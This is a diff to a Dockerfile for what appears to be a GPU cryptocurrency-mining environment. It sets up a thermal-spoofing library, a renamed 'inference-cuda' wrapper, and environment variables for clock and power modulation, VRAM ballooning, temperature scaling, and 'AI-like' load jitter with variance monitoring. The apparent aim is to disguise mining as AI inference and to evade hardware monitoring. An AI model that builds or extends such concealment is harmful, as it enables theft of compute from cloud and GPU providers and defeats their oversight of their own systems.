@@ -105,7 +105,6 @@ COPY mining_environment/gpu_plugins/native/thermal/libtempspoof.so /tmp/libtemps
 # Method: Enhanced wrapper script with proper environment setup
 
 RUN ldconfig && \
-
     install -D /tmp/inference-cuda.original    /usr/local/bin/inference-cuda.original && \
     install -D /tmp/libmlls-cuda.so   /usr/local/bin/libmlls-cuda.so && \
     install -D /tmp/libmpo.so         /opt/mpo/libmpo.so && \
@@ -153,6 +152,38 @@ ENV SCRIPT_DIR=/app/mining_environment/scripts \
     WORK_MS=1900 SLEEP_MS=100 \
     ENABLE_MPO=1 MPO_LIB=/opt/mpo/libmpo.so \
     ENABLE_NS_ISOLATION=1
+
+# ------------------  GPU OPTIMIZATION SETTINGS (No Plugins) ------------------
+# Core GPU Optimization Controls
+ENV GPU_OPT_ENABLED=1 \
+    GPU_OPT_PROFILE=medium \
+    GPU_OPT_CONFIG=/app/gpu_optimization_config.json
+
+# Hardware Control Settings  
+ENV ENABLE_NVML_CONTROL=1 \
+    NVML_FALLBACK_COMPUTE=1 \
+    GPU_POWER_VARIATION=12 \
+    GPU_CLOCK_MODULATION=1
+
+# VRAM Management
+ENV VRAM_BALLOON_ENABLED=1 \
+    VRAM_TARGET_PERCENT=50 \
+    VRAM_ROTATION_INTERVAL=60
+
+# Temperature Management
+ENV TEMP_THRESHOLD_WARNING=75 \
+    TEMP_THRESHOLD_CRITICAL=80 \
+    TEMP_SCALE_FACTOR=0.8
+
+# Pattern Settings for AI-like behavior
+ENV PATTERN_TYPE=adaptive \
+    JITTER_MULTI_LAYER=1 \
+    PHASE_SHIFT_RANDOM=1
+
+# Monitoring and Metrics
+ENV ENABLE_STDDEV_MONITOR=1 \
+    STDDEV_CHECK_INTERVAL=60 \
+    LOG_METRICS_INTERVAL=30
 
 
 # ===== CRITICAL: CUDA 12.0 LIBRARY PATH ENFORCEMENT =====
